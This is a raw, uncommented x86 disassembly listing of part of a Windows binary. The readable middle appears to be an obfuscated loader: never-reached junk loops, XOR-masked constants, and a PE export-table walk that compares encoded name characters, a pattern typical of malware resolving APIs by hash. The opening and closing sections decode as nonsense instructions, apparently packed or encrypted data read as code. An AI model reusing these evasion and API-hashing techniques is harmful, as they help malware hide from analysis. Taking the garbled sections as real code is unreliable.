  40a1e1:	adc    BYTE PTR [esi+0xfe53bc7],bh
  40a1e7:	sbb    DWORD PTR [ebp-0x4d],eax
  40a1ea:	jae    0x40a249
  40a1ec:	iret   
  40a1ed:	and    BYTE PTR [esi],0x9c
  40a1f0:	lea    ebp,[esi+0x4]
  40a1f3:	cld    
  40a1f4:	mov    WORD PTR [esi],es
  40a1f6:	push   es
  40a1f7:	push   ebp
  40a1f8:	fimul  WORD PTR ds:0x776a2084
  40a1fe:	xor    DWORD PTR [ecx+0x6a],ebp
  40a201:	pop    ds
  40a202:	xor    DWORD PTR [ebx],0xffffffd0
  40a205:	(bad)  [ebx-0xf]
  40a208:	fstp   TBYTE PTR [eax]
  40a20a:	ret    0x5a7
  40a20d:	xor    edi,DWORD PTR [eax]
  40a20f:	adc    eax,0x59fe33b1
  40a214:	fsubp  st(1),st
  40a216:	mov    al,0x32
  40a218:	pop    es
  40a219:	jns    0x40a214
  40a21b:	push   ebx
  40a21c:	dec    ecx
  40a21d:	cmp    DWORD PTR [edx+0x3124db94],0x1425fa34
  40a227:	push   ss
  40a228:	and    BYTE PTR [edx+0x41],dl
  40a22b:	std    
  40a22c:	rcr    ch,cl
  40a22e:	pushf  
  40a22f:	mov    edx,0x7b4ba84b
  40a234:	and    dl,cl
  40a236:	lea    ebx,[edx]
  40a238:	loopne 0x40a281
  40a23a:	shl    BYTE PTR [ecx],0x15
  40a23d:	fnstsw WORD PTR [edi+eax*1-0x6481c9bf]
  40a244:	fist   WORD PTR [edi-0x2365db4f]
  40a24a:	les    eax,FWORD PTR [ecx-0x6b]
  40a24d:	push   es
  40a24e:	loopne 0x40a2b0
  40a250:	mov    edx,0x9beef899
  40a255:	dec    ecx
  40a256:	xor    ah,ah
  40a258:	dec    eax
  40a259:	lea    eax,[eax+edi*1+0x64e5c4]
  40a260:	mov    edi,DWORD PTR [ebp+0xc]
  40a263:	xor    edi,ecx
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	(bad)  
  40abd7:	pop    esp
  40abd8:	fprem  
  40abda:	mov    cl,BYTE PTR [esi]
  40abdc:	push   es
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	and    BYTE PTR [esi-0x79],al
  40abe6:	das    
  40abe7:	fwait
  40abe8:	int3   
  40abe9:	ror    BYTE PTR [ebp+eax*1-0x6d],1
  40abed:	dec    edi
  40abee:	popf   
  40abef:	sub    eax,0xb8a8c2d7
  40abf4:	mov    eax,ds:0xcfb40c15
  40abf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfa:	or     edi,DWORD PTR [ebp-0x68ef46ba]
  40ac00:	pop    eax
  40ac01:	int3   
  40ac02:	aaa    
  40ac03:	sbb    ah,BYTE PTR [esi+0x36]
  40ac06:	scas   al,BYTE PTR es:[edi]
  40ac07:	jae    0x40ac13
  40ac09:	sub    BYTE PTR [edx],ch
  40ac0b:	inc    esi
  40ac0c:	push   edx
  40ac0d:	mov    bh,0xf0
  40ac0f:	imul   edx,DWORD PTR ds:0x248137fe,0x41124080
  40ac19:	enter  0xa9a2,0x44
  40ac1d:	in     eax,dx
  40ac1e:	(bad)  
  40ac1f:	out    dx,eax
  40ac20:	jmp    0x12b9:0x6a9fe032
  40ac27:	hlt    
  40ac28:	mov    bl,0x1d
  40ac2a:	cli    
  40ac2b:	pop    ds
  40ac2c:	into   
  40ac2d:	jmp    0x40ac7e
  40ac2f:	inc    edi
  40ac30:	hlt    
  40ac31:	retf   0xa65c
  40ac34:	xor    BYTE PTR [edx],al
  40ac36:	scas   eax,DWORD PTR es:[edi]
  40ac37:	mov    eax,eax
  40ac39:	add    DWORD PTR [ebx],ebp
  40ac3b:	daa    
  40ac3c:	mov    al,ds:0x1a8565cb
  40ac41:	adc    eax,0xbadec072
  40ac46:	xchg   DWORD PTR [edx-0x24],ecx
  40ac49:	fsubr  QWORD PTR [eax-0x1e883318]
  40ac4f:	js     0x40ac2c
  40ac51:	popa   
  40ac52:	ficom  DWORD PTR ds:0x2174c3e4
  40ac58:	rcr    DWORD PTR [edx+0x30],0x15
  40ac5c:	retf   0x2347
  40ac5f:	mov    ch,0xde
  40ac61:	(bad)  
  40ac63:	icebp  
  40ac64:	cmc    
  40ac65:	repnz daa 
  40ac67:	pop    eax
  40ac68:	inc    eax
  40ac69:	mov    ?,WORD PTR [edx+edx*2+0x11]
  40ac6d:	clc    
  40ac6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6f:	stc    
  40ac70:	gs dec esi
  40ac72:	aas    
  40ac73:	mov    eax,0x4c985906
  40ac78:	cmp    al,0x82
  40ac7a:	jae    0x40ac68
  40ac7c:	add    al,0xc0
  40ac7e:	inc    ebx
  40ac7f:	fwait
  40ac80:	jecxz  0x40acb1
  40ac82:	pop    eax
  40ac83:	arpl   WORD PTR [edx],si
  40ac85:	in     eax,dx
  40ac86:	test   edi,ebp
  40ac88:	out    dx,al
  40ac89:	xor    edi,DWORD PTR [edx]
  40ac8b:	cmp    ah,BYTE PTR [edx-0x3c]
